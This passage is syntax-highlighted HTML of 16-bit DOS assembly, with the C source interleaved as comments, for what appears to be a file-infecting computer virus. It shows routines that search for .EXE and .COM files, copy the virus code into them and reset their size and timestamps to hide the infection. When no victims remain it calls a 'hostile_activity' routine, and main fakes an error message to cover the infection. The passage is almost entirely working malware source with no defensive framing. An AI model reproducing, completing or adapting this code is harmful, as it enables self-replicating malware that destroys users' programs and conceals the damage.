    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">21</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cbw</span><span class="sc0"> 
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__creat</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* Copy virus */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        virus_size = _read(virus_handle, virus_code, sizeof(virus_code));</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4736</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4740</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__read</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        _write(victim_handle, virus_code, virus_size);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">4740</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">__write</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        puts("Almost done...");</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* Reset victim's file date, time, and size */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        chsize(victim_handle, victim-&gt;ff_fsize);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_chsize</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        setftime(victim_handle, (struct ftime *) &amp;victim-&gt;ff_ftime);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">22</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_setftime</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* Close files */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        close(virus_handle);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_close</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        close(victim_handle);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_close</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;        puts("Infection complete!");</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">_spread</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'BSS'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_BSS</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    struct ffblk *victim(void)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
</span><span class="sc5">_victim</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    {</span><span class="sc0">
   </span><span class="sc1">;        /* This function returns a pointer to the name of the virus's next</span><span class="sc0">
   </span><span class="sc1">;           victim.  This routine is set up to try to infect .EXE and .COM</span><span class="sc0">
   </span><span class="sc1">;           files.  If there is a command line argument, it will try to infect</span><span class="sc0">
   </span><span class="sc1">;           that file instead.  If all files are infected, hostile activity</span><span class="sc0">
   </span><span class="sc1">;           is initiated...</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        register int done;</span><span class="sc0">
   </span><span class="sc1">;        register char **ext;</span><span class="sc0">
   </span><span class="sc1">;        static char *types[] = {"*.EXE", "*.COM", NULL};</span><span class="sc0">
   </span><span class="sc1">;        static struct ffblk ffblk;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        for (ext = (*++_argv) ? _argv : types; *ext; ext++) {</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">__argv</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">__argv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@74</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">__argv</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@98</span><span class="sc0">
</span><span class="sc5">@4@74</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">d@w</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">@4@98</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@362</span><span class="sc0">
</span><span class="sc5">@4@122</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;            done = findfirst(*ext, &amp;ffblk, FA_RDONLY | FA_HIDDEN | FA_SYSTEM | FA_ARCH);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">39</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_findfirst</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@290</span><span class="sc0">
</span><span class="sc5">@4@146</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;            while (!done) {</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    #ifdef DEBUG</span><span class="sc0">
   </span><span class="sc1">;                printf("Scanning %s...\n", ffblk.ff_name);</span><span class="sc0">
   </span><span class="sc1">;    #endif</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* If you want to check for specific days of the week, months, etc.,</span><span class="sc0">
   </span><span class="sc1">;           here is the place to insert the code (don't forget to "#include</span><span class="sc0">
   </span><span class="sc1">;           &lt;time.h&gt;").</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;                if ((ffblk.ff_fsize &gt; TOO_SMALL) &amp;&amp; (!infected(ffblk.ff_name)))</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jl</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@266</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@218</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc4">,</span><span class="sc2">4735</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@266</span><span class="sc0">
</span><span class="sc5">@4@218</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_infected</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@266</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;                    return(&amp;ffblk);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@410</span><span class="sc0">
</span><span class="sc5">@4@266</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;                done = findnext(&amp;ffblk);</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">b@w</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_findnext</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc5">@4@290</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@146</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">@4@362</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">@4@122</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;            }</span><span class="sc0">
   </span><span class="sc1">;        }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        /* If there are no files left to infect, have a little fun */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        hostile_activity();</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_hostile_activity</span><span class="sc0">
</span><span class="sc5">@4@410</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    }</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">_victim</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">26</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">41</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">61</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">78</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">97</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">115</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">s@</span><span class="sc4">+</span><span class="sc2">144</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc5">_TEXT</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    int main(void)</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">
</span><span class="sc5">_main</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    {</span><span class="sc0">
   </span><span class="sc1">;        /* In the main program, a victim is found and infected.  If all files</span><span class="sc0">
   </span><span class="sc1">;           are infected, a malicious action is performed.  Otherwise, a bogus</span><span class="sc0">
   </span><span class="sc1">;           error message is displayed, and the virus terminates with code</span><span class="sc0">
   </span><span class="sc1">;           1, simulating an error.</span><span class="sc0">
   </span><span class="sc1">;        */</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        static char *err_msg[] = {"Out of memory", "Bad EXE format",</span><span class="sc0">
   </span><span class="sc1">;                      "Invalid DOS version", "Bad memory block",</span><span class="sc0">
   </span><span class="sc1">;                      "FCB creation error", "Sharing violation",</span><span class="sc0">
   </span><span class="sc1">;                      "Abnormal program termination",</span><span class="sc0">
   </span><span class="sc1">;                      "Divide error"</span><span class="sc0">
   </span><span class="sc1">;                     };</span><span class="sc0">
   </span><span class="sc1">;        register char *virus_name = *_argv;</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">DGROUP</span><span class="sc4">:</span><span class="sc5">__argv</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
   </span><span class="sc1">;        spread(virus_name, victim());</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_victim</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">_spread</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc1">;    </span><span class="sc0">
